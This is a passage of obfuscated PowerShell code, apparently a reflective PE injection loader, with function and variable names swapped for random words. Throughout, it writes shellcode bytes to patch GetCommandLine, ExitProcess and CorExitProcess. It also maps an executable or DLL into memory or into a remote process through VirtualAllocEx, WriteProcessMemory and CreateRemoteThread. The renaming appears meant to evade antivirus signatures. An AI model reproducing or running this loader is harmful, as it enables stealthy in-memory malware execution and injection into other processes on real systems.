			[IntPtr]$kKFshAqE99 = federally ($PEInfo.PEHandle) ($SaVqDsAt99.VirtualAddress)
			
			[UInt32]$NSPdwlPg99 = pushiest $SaVqDsAt99.Characteristics
			[UInt32]$vNvIxYkB99 = $SaVqDsAt99.VirtualSize
			
			[UInt32]$oBDQthPz99 = 0
			geniuses -KbloWTRq99 "anathema::VirtualProtect" -PEInfo $PEInfo -StartAddress $kKFshAqE99 -Size $vNvIxYkB99 | Out-Null
			$gTWWHesS99 = $tFmeXFwi99.VirtualProtect.Invoke($kKFshAqE99, $vNvIxYkB99, $NSPdwlPg99, [Ref]$oBDQthPz99)
			if ($gTWWHesS99 -eq $false)
			{
				Throw "Unable to change memory protection"
			}
		}
	}
	
	Function sunrises
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$tFmeXFwi99,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		$lVsOOlLd99,
		
		[Parameter(Position = 4, Mandatory = $true)]
		[IntPtr]
		$ohgsMoQC99
		)
		
		$PfqVvojM99 = @() 
		
		$tkDghQTk99 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		[UInt32]$oBDQthPz99 = 0
		
		[IntPtr]$PbFFltLi99 = $tFmeXFwi99.GetModuleHandle.Invoke("Kernel32.dll")
		if ($PbFFltLi99 -eq [IntPtr]::Zero)
		{
			throw "Kernel32 handle null"
		}
		
		[IntPtr]$axnXGIYt99 = $tFmeXFwi99.GetModuleHandle.Invoke("KernelBase.dll")
		if ($axnXGIYt99 -eq [IntPtr]::Zero)
		{
			throw "KernelBase handle null"
		}
		$SekvxLfY99 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($lVsOOlLd99)
		$XRyvGIZy99 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($lVsOOlLd99)
	
		[IntPtr]$oTohCvCa99 = $tFmeXFwi99.GetProcAddress.Invoke($axnXGIYt99, "GetCommandLineA")
		[IntPtr]$ooUJVVFD99 = $tFmeXFwi99.GetProcAddress.Invoke($axnXGIYt99, "GetCommandLineW")
		if ($oTohCvCa99 -eq [IntPtr]::Zero -or $ooUJVVFD99 -eq [IntPtr]::Zero)
		{
			throw "GetCommandLine ptr null. GetCommandLineA: $oTohCvCa99. GetCommandLineW: $ooUJVVFD99"
		}
		[Byte[]]$MqZgrciG99 = @()
		if ($tkDghQTk99 -eq 8)
		{
			$MqZgrciG99 += 0x48	#64bit shellcode has the 0x48 before the 0xb8
		}
		$MqZgrciG99 += 0xb8
		
		[Byte[]]$XACmedmg99 = @(0xc3)
		$tOnzdiii99 = $MqZgrciG99.Length + $tkDghQTk99 + $XACmedmg99.Length
		
		
		$HmNPHvGK99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($tOnzdiii99)
		$fKhGaqLq99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($tOnzdiii99)
		$tFmeXFwi99.memcpy.Invoke($HmNPHvGK99, $oTohCvCa99, [UInt64]$tOnzdiii99) | Out-Null
		$tFmeXFwi99.memcpy.Invoke($fKhGaqLq99, $ooUJVVFD99, [UInt64]$tOnzdiii99) | Out-Null
		$PfqVvojM99 += ,($oTohCvCa99, $HmNPHvGK99, $tOnzdiii99)
		$PfqVvojM99 += ,($ooUJVVFD99, $fKhGaqLq99, $tOnzdiii99)
		[UInt32]$oBDQthPz99 = 0
		$gTWWHesS99 = $tFmeXFwi99.VirtualProtect.Invoke($oTohCvCa99, [UInt32]$tOnzdiii99, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$oBDQthPz99)
		if ($gTWWHesS99 = $false)
		{
			throw "Call to VirtualProtect failed"
		}
		
		$SflPyHXU99 = $oTohCvCa99
		manufacture -Bytes $MqZgrciG99 -EwGuMsLx99 $SflPyHXU99
		$SflPyHXU99 = federally $SflPyHXU99 ($MqZgrciG99.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($XRyvGIZy99, $SflPyHXU99, $false)
		$SflPyHXU99 = federally $SflPyHXU99 $tkDghQTk99
		manufacture -Bytes $XACmedmg99 -EwGuMsLx99 $SflPyHXU99
		
		$tFmeXFwi99.VirtualProtect.Invoke($oTohCvCa99, [UInt32]$tOnzdiii99, [UInt32]$oBDQthPz99, [Ref]$oBDQthPz99) | Out-Null
		
		
		[UInt32]$oBDQthPz99 = 0
		$gTWWHesS99 = $tFmeXFwi99.VirtualProtect.Invoke($ooUJVVFD99, [UInt32]$tOnzdiii99, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$oBDQthPz99)
		if ($gTWWHesS99 = $false)
		{
			throw "Call to VirtualProtect failed"
		}
		
		$xHyQcYHE99 = $ooUJVVFD99
		manufacture -Bytes $MqZgrciG99 -EwGuMsLx99 $xHyQcYHE99
		$xHyQcYHE99 = federally $xHyQcYHE99 ($MqZgrciG99.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($SekvxLfY99, $xHyQcYHE99, $false)
		$xHyQcYHE99 = federally $xHyQcYHE99 $tkDghQTk99
		manufacture -Bytes $XACmedmg99 -EwGuMsLx99 $xHyQcYHE99
		
		$tFmeXFwi99.VirtualProtect.Invoke($ooUJVVFD99, [UInt32]$tOnzdiii99, [UInt32]$oBDQthPz99, [Ref]$oBDQthPz99) | Out-Null
		
		
		$iCKHVEtM99 = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
			, "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll")
		
		foreach ($Dll in $iCKHVEtM99)
		{
			[IntPtr]$nVjaUrTV99 = $tFmeXFwi99.GetModuleHandle.Invoke($Dll)
			if ($nVjaUrTV99 -ne [IntPtr]::Zero)
			{
				[IntPtr]$tvkqZoUH99 = $tFmeXFwi99.GetProcAddress.Invoke($nVjaUrTV99, "_wcmdln")
				[IntPtr]$oBYZgujF99 = $tFmeXFwi99.GetProcAddress.Invoke($nVjaUrTV99, "_acmdln")
				if ($tvkqZoUH99 -eq [IntPtr]::Zero -or $oBYZgujF99 -eq [IntPtr]::Zero)
				{
					"Error, couldn't find _wcmdln or _acmdln"
				}
				
				$aRdGmYMe99 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($lVsOOlLd99)
				$JCCOliuv99 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($lVsOOlLd99)
				
				$BzGWMmZZ99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($oBYZgujF99, [Type][IntPtr])
				$oPeIQPhA99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($tvkqZoUH99, [Type][IntPtr])
				$vFEAVktD99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($tkDghQTk99)
				$pGYCUCYq99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($tkDghQTk99)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($BzGWMmZZ99, $vFEAVktD99, $false)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($oPeIQPhA99, $pGYCUCYq99, $false)
				$PfqVvojM99 += ,($oBYZgujF99, $vFEAVktD99, $tkDghQTk99)
				$PfqVvojM99 += ,($tvkqZoUH99, $pGYCUCYq99, $tkDghQTk99)
				
				$gTWWHesS99 = $tFmeXFwi99.VirtualProtect.Invoke($oBYZgujF99, [UInt32]$tkDghQTk99, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$oBDQthPz99)
				if ($gTWWHesS99 = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($aRdGmYMe99, $oBYZgujF99, $false)
				$tFmeXFwi99.VirtualProtect.Invoke($oBYZgujF99, [UInt32]$tkDghQTk99, [UInt32]($oBDQthPz99), [Ref]$oBDQthPz99) | Out-Null
				
				$gTWWHesS99 = $tFmeXFwi99.VirtualProtect.Invoke($tvkqZoUH99, [UInt32]$tkDghQTk99, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$oBDQthPz99)
				if ($gTWWHesS99 = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($JCCOliuv99, $tvkqZoUH99, $false)
				$tFmeXFwi99.VirtualProtect.Invoke($tvkqZoUH99, [UInt32]$tkDghQTk99, [UInt32]($oBDQthPz99), [Ref]$oBDQthPz99) | Out-Null
			}
		}
		
		
		$PfqVvojM99 = @()
		$uOetvzQG99 = @() #Array of functions to overwrite so the thread doesn't exit the process
		
		[IntPtr]$tyREpyiK99 = $tFmeXFwi99.GetModuleHandle.Invoke("mscoree.dll")
		if ($tyREpyiK99 -eq [IntPtr]::Zero)
		{
			throw "mscoree handle null"
		}
		[IntPtr]$RBOeuyRl99 = $tFmeXFwi99.GetProcAddress.Invoke($tyREpyiK99, "CorExitProcess")
		if ($RBOeuyRl99 -eq [IntPtr]::Zero)
		{
			Throw "CorExitProcess address not found"
		}
		$uOetvzQG99 += $RBOeuyRl99
		
		[IntPtr]$mkOeKzob99 = $tFmeXFwi99.GetProcAddress.Invoke($PbFFltLi99, "ExitProcess")
		if ($mkOeKzob99 -eq [IntPtr]::Zero)
		{
			Throw "ExitProcess address not found"
		}
		$uOetvzQG99 += $mkOeKzob99
		
		[UInt32]$oBDQthPz99 = 0
		foreach ($JBHDBAOX99 in $uOetvzQG99)
		{
			$XuVdAdLL99 = $JBHDBAOX99
			[Byte[]]$MqZgrciG99 = @(0xbb)
			[Byte[]]$XACmedmg99 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
			if ($tkDghQTk99 -eq 8)
			{
				[Byte[]]$MqZgrciG99 = @(0x48, 0xbb)
				[Byte[]]$XACmedmg99 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
			}
			[Byte[]]$ilQBudjx99 = @(0xff, 0xd3)
			$tOnzdiii99 = $MqZgrciG99.Length + $tkDghQTk99 + $XACmedmg99.Length + $tkDghQTk99 + $ilQBudjx99.Length
			
			[IntPtr]$oluvexdp99 = $tFmeXFwi99.GetProcAddress.Invoke($PbFFltLi99, "ExitThread")
			if ($oluvexdp99 -eq [IntPtr]::Zero)
			{
				Throw "ExitThread address not found"
			}
			$gTWWHesS99 = $tFmeXFwi99.VirtualProtect.Invoke($JBHDBAOX99, [UInt32]$tOnzdiii99, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$oBDQthPz99)
			if ($gTWWHesS99 -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}
			
			$GZMCrVVP99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($tOnzdiii99)
			$tFmeXFwi99.memcpy.Invoke($GZMCrVVP99, $JBHDBAOX99, [UInt64]$tOnzdiii99) | Out-Null
			$PfqVvojM99 += ,($JBHDBAOX99, $GZMCrVVP99, $tOnzdiii99)
			
			manufacture -Bytes $MqZgrciG99 -EwGuMsLx99 $XuVdAdLL99
			$XuVdAdLL99 = federally $XuVdAdLL99 ($MqZgrciG99.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($ohgsMoQC99, $XuVdAdLL99, $false)
			$XuVdAdLL99 = federally $XuVdAdLL99 $tkDghQTk99
			manufacture -Bytes $XACmedmg99 -EwGuMsLx99 $XuVdAdLL99
			$XuVdAdLL99 = federally $XuVdAdLL99 ($XACmedmg99.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($oluvexdp99, $XuVdAdLL99, $false)
			$XuVdAdLL99 = federally $XuVdAdLL99 $tkDghQTk99
			manufacture -Bytes $ilQBudjx99 -EwGuMsLx99 $XuVdAdLL99
			$tFmeXFwi99.VirtualProtect.Invoke($JBHDBAOX99, [UInt32]$tOnzdiii99, [UInt32]$oBDQthPz99, [Ref]$oBDQthPz99) | Out-Null
		}
		Write-Output $PfqVvojM99
	}
	
	
	Function returnables
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Array[]]
		$QJrjTSsh99,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$tFmeXFwi99,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		[UInt32]$oBDQthPz99 = 0
		foreach ($Info in $QJrjTSsh99)
		{
			$gTWWHesS99 = $tFmeXFwi99.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$oBDQthPz99)
			if ($gTWWHesS99 -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}
			
			$tFmeXFwi99.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null
			
			$tFmeXFwi99.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$oBDQthPz99, [Ref]$oBDQthPz99) | Out-Null
		}
	}
	Function impressionistic
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$PthOGtLn99,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		$FunctionName
		)
		
		$fsGKSFYp99 = send
		$Win32Constants = sidetracks
		$PEInfo = tartars -PthOGtLn99 $PthOGtLn99 -fsGKSFYp99 $fsGKSFYp99 -Win32Constants $Win32Constants
		
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
		{
			return [IntPtr]::Zero
		}
		$IrQnnVMH99 = federally ($PthOGtLn99) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
		$nvHHnwHd99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($IrQnnVMH99, [Type]$fsGKSFYp99.IMAGE_EXPORT_DIRECTORY)
		
		for ($i = 0; $i -lt $nvHHnwHd99.NumberOfNames; $i++)
		{
			$DIDRpYZd99 = federally ($PthOGtLn99) ($nvHHnwHd99.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
			$nKSprdVT99 = federally ($PthOGtLn99) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($DIDRpYZd99, [Type][UInt32]))
			$Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($nKSprdVT99)
			if ($Name -ceq $FunctionName)
			{
				$TYpkIlaw99 = federally ($PthOGtLn99) ($nvHHnwHd99.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
				$PyreeMPa99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TYpkIlaw99, [Type][UInt16])
				$CejINyxI99 = federally ($PthOGtLn99) ($nvHHnwHd99.AddressOfFunctions + ($PyreeMPa99 * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
				$ArZVpjxb99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($CejINyxI99, [Type][UInt32])
				return federally ($PthOGtLn99) ($ArZVpjxb99)
			}
		}
		
		return [IntPtr]::Zero
	}
	Function detect
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$NJImiPos99,
		
		[Parameter(Position = 1, Mandatory = $false)]
		[String]
		$DDrAwOrQ99,
		
		[Parameter(Position = 2, Mandatory = $false)]
		[IntPtr]
		$lDVqRULn99
		)
		
		$tkDghQTk99 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		$Win32Constants = sidetracks
		$tFmeXFwi99 = rehabilitate
		$fsGKSFYp99 = send
		
		$UTndHzZD99 = $false
		if (($lDVqRULn99 -ne $null) -and ($lDVqRULn99 -ne [IntPtr]::Zero))
		{
			$UTndHzZD99 = $true
		}
		
		Write-Verbose "Getting basic PE information from the file"
		$PEInfo = emeritus -NJImiPos99 $NJImiPos99 -fsGKSFYp99 $fsGKSFYp99
		$dmDMjxqO99 = $PEInfo.OriginalImageBase
		$MwtVpRqu99 = $true
		if (([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
		{
			Write-Warning "PE is not compatible with DEP, might cause issues" -WarningAction Continue
			$MwtVpRqu99 = $false
		}
		
		
		$jOZXiPqk99 = $true
		if ($UTndHzZD99 -eq $true)
		{
			$PbFFltLi99 = $tFmeXFwi99.GetModuleHandle.Invoke("kernel32.dll")
			$IUgPuxxH99 = $tFmeXFwi99.GetProcAddress.Invoke($PbFFltLi99, "IsWow64Process")
			if ($IUgPuxxH99 -eq [IntPtr]::Zero)
			{
				Throw "Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit"
			}
			
			[Bool]$pQyevMNJ99 = $false
			$gTWWHesS99 = $tFmeXFwi99.IsWow64Process.Invoke($lDVqRULn99, [Ref]$pQyevMNJ99)
			if ($gTWWHesS99 -eq $false)
			{
				Throw "Call to IsWow64Process failed"
			}
			
			if (($pQyevMNJ99 -eq $true) -or (($pQyevMNJ99 -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
			{
				$jOZXiPqk99 = $false
			}
			
			$UyKbXhXv99 = $true
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$UyKbXhXv99 = $false
			}
			if ($UyKbXhXv99 -ne $jOZXiPqk99)
			{
				throw "PowerShell must be same architecture (x86/x64) as PE being loaded and remote process"
			}
		}
		else
		{
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$jOZXiPqk99 = $false
			}
		}
		if ($jOZXiPqk99 -ne $PEInfo.PE64Bit)
		{
			Throw "PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
		}
		
		Write-Verbose "Allocating memory for the PE and write its headers to memory"
		
		[IntPtr]$LpYGSfOK99 = [IntPtr]::Zero
		if (([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE)
		{
			Write-Warning "PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again" -WarningAction Continue
			[IntPtr]$LpYGSfOK99 = $dmDMjxqO99
		}
		$PthOGtLn99 = [IntPtr]::Zero				#This is where the PE is allocated in PowerShell
		$VYAPrRsC99 = [IntPtr]::Zero		#This is the address the PE will be loaded to. If it is loaded in PowerShell, this equals $PthOGtLn99. If it is loaded in a remote process, this is the address in the remote process.
		if ($UTndHzZD99 -eq $true)
		{
			$PthOGtLn99 = $tFmeXFwi99.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			
			$VYAPrRsC99 = $tFmeXFwi99.VirtualAllocEx.Invoke($lDVqRULn99, $LpYGSfOK99, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($VYAPrRsC99 -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
			}
		}
		else
		{
			if ($MwtVpRqu99 -eq $true)
			{
				$PthOGtLn99 = $tFmeXFwi99.VirtualAlloc.Invoke($LpYGSfOK99, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			}
			else
			{
				$PthOGtLn99 = $tFmeXFwi99.VirtualAlloc.Invoke($LpYGSfOK99, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			}
			$VYAPrRsC99 = $PthOGtLn99
		}
		
		[IntPtr]$vlZomopx99 = federally ($PthOGtLn99) ([Int64]$PEInfo.SizeOfImage)
		if ($PthOGtLn99 -eq [IntPtr]::Zero)
		{ 
			Throw "VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
		}		
		[System.Runtime.InteropServices.Marshal]::Copy($NJImiPos99, 0, $PthOGtLn99, $PEInfo.SizeOfHeaders) | Out-Null
		
		
		Write-Verbose "Getting detailed PE information from the headers loaded in memory"
		$PEInfo = tartars -PthOGtLn99 $PthOGtLn99 -fsGKSFYp99 $fsGKSFYp99 -Win32Constants $Win32Constants
		$PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $vlZomopx99
		$PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $VYAPrRsC99
		Write-Verbose "StartAddress: $PthOGtLn99    EndAddress: $vlZomopx99"
		
		
		Write-Verbose "Copy PE sections in to memory"
		ogling -NJImiPos99 $NJImiPos99 -PEInfo $PEInfo -tFmeXFwi99 $tFmeXFwi99 -fsGKSFYp99 $fsGKSFYp99
		
		
		Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
		crayoned -PEInfo $PEInfo -dmDMjxqO99 $dmDMjxqO99 -Win32Constants $Win32Constants -fsGKSFYp99 $fsGKSFYp99
		
		Write-Verbose "Import DLL's needed by the PE we are loading"
		if ($UTndHzZD99 -eq $true)
		{
			Fokker -PEInfo $PEInfo -tFmeXFwi99 $tFmeXFwi99 -fsGKSFYp99 $fsGKSFYp99 -Win32Constants $Win32Constants -lDVqRULn99 $lDVqRULn99
		}
		else
		{
			Fokker -PEInfo $PEInfo -tFmeXFwi99 $tFmeXFwi99 -fsGKSFYp99 $fsGKSFYp99 -Win32Constants $Win32Constants
		}
		
		
		if ($UTndHzZD99 -eq $false)
		{
			if ($MwtVpRqu99 -eq $true)
			{
				Write-Verbose "Update memory protection flags"
				anathema -PEInfo $PEInfo -tFmeXFwi99 $tFmeXFwi99 -Win32Constants $Win32Constants -fsGKSFYp99 $fsGKSFYp99
			}
			else
			{
				Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
			}
		}
		else
		{
			Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
		}
		
		
		if ($UTndHzZD99 -eq $true)
		{
			[UInt32]$XsXKnFGs99 = 0
			$gTWWHesS99 = $tFmeXFwi99.WriteProcessMemory.Invoke($lDVqRULn99, $VYAPrRsC99, $PthOGtLn99, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$XsXKnFGs99)
			if ($gTWWHesS99 -eq $false)
			{
				Throw "Unable to write shellcode to remote process memory."
			}
		}
		
		
		if ($PEInfo.FileType -ieq "DLL")
		{
			if ($UTndHzZD99 -eq $false)
			{
				Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
				$RCwgGsQQ99 = federally ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				$BSSDmBDY99 = mesa @([IntPtr], [UInt32], [IntPtr]) ([Bool])
				$HjviUJRn99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($RCwgGsQQ99, $BSSDmBDY99)
				
				$HjviUJRn99.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
			}
			else
			{
				$RCwgGsQQ99 = federally ($VYAPrRsC99) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			
				if ($PEInfo.PE64Bit -eq $true)
				{
					$GeLXEYzU99 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
					$hxWqysxb99 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
					$FfKUfFfX99 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
				}
				else
				{
					$GeLXEYzU99 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
					$hxWqysxb99 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
					$FfKUfFfX99 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
				}
				$qjUUrHfn99 = $GeLXEYzU99.Length + $hxWqysxb99.Length + $FfKUfFfX99.Length + ($tkDghQTk99 * 2)
				$qRxdBxjK99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($qjUUrHfn99)
				$LXbMBRwW99 = $qRxdBxjK99
				
				manufacture -Bytes $GeLXEYzU99 -EwGuMsLx99 $qRxdBxjK99
				$qRxdBxjK99 = federally $qRxdBxjK99 ($GeLXEYzU99.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($VYAPrRsC99, $qRxdBxjK99, $false)
				$qRxdBxjK99 = federally $qRxdBxjK99 ($tkDghQTk99)
				manufacture -Bytes $hxWqysxb99 -EwGuMsLx99 $qRxdBxjK99
				$qRxdBxjK99 = federally $qRxdBxjK99 ($hxWqysxb99.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($RCwgGsQQ99, $qRxdBxjK99, $false)
				$qRxdBxjK99 = federally $qRxdBxjK99 ($tkDghQTk99)
				manufacture -Bytes $FfKUfFfX99 -EwGuMsLx99 $qRxdBxjK99
				$qRxdBxjK99 = federally $qRxdBxjK99 ($FfKUfFfX99.Length)
				
				$GaAnhdqE99 = $tFmeXFwi99.VirtualAllocEx.Invoke($lDVqRULn99, [IntPtr]::Zero, [UIntPtr][UInt64]$qjUUrHfn99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
				if ($GaAnhdqE99 -eq [IntPtr]::Zero)
				{
					Throw "Unable to allocate memory in the remote process for shellcode"
				}
				
				$gTWWHesS99 = $tFmeXFwi99.WriteProcessMemory.Invoke($lDVqRULn99, $GaAnhdqE99, $LXbMBRwW99, [UIntPtr][UInt64]$qjUUrHfn99, [Ref]$XsXKnFGs99)
				if (($gTWWHesS99 -eq $false) -or ([UInt64]$XsXKnFGs99 -ne [UInt64]$qjUUrHfn99))
				{
					Throw "Unable to write shellcode to remote process memory."
				}
				$MLesLGoP99 = impregnation -gmLJonUI99 $lDVqRULn99 -StartAddress $GaAnhdqE99 -tFmeXFwi99 $tFmeXFwi99
				$IUgPuxxH99 = $tFmeXFwi99.WaitForSingleObject.Invoke($MLesLGoP99, 20000)
				if ($IUgPuxxH99 -ne 0)
				{
					Throw "Call to CreateRemoteThread to call GetProcAddress failed."
				}
				
				$tFmeXFwi99.VirtualFreeEx.Invoke($lDVqRULn99, $GaAnhdqE99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			}
		}
		elseif ($PEInfo.FileType -ieq "EXE")
		{
			[IntPtr]$ohgsMoQC99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
			[System.Runtime.InteropServices.Marshal]::WriteByte($ohgsMoQC99, 0, 0x00)
			$CljtPJIl99 = sunrises -PEInfo $PEInfo -tFmeXFwi99 $tFmeXFwi99 -Win32Constants $Win32Constants -lVsOOlLd99 $DDrAwOrQ99 -ohgsMoQC99 $ohgsMoQC99
			[IntPtr]$FNJBJpzY99 = federally ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			Write-Verbose "Call EXE Main function. Address: $FNJBJpzY99. Creating thread for the EXE to run in."
			$tFmeXFwi99.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $FNJBJpzY99, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null
			while($true)
			{
				[Byte]$nHAMUOjO99 = [System.Runtime.InteropServices.Marshal]::ReadByte($ohgsMoQC99, 0)
				if ($nHAMUOjO99 -eq 1)
				{
					returnables -QJrjTSsh99 $CljtPJIl99 -tFmeXFwi99 $tFmeXFwi99 -Win32Constants $Win32Constants
					Write-Verbose "EXE thread has completed."
					break
				}
				else
				{
					Start-Sleep -Seconds 1
				}
			}
		}
		
		return @($PEInfo.PEHandle, $VYAPrRsC99)
	}
	
	
	Function Willard
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$PthOGtLn99
		)
		
		$Win32Constants = sidetracks
		$tFmeXFwi99 = rehabilitate
		$fsGKSFYp99 = send
		
		$PEInfo = tartars -PthOGtLn99 $PthOGtLn99 -fsGKSFYp99 $fsGKSFYp99 -Win32Constants $Win32Constants
		
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$tGsSkXmW99 = federally ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$vMfcpWxk99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($tGsSkXmW99, [Type]$fsGKSFYp99.IMAGE_IMPORT_DESCRIPTOR)
				
				if ($vMfcpWxk99.Characteristics -eq 0 `
						-and $vMfcpWxk99.FirstThunk -eq 0 `
						-and $vMfcpWxk99.ForwarderChain -eq 0 `
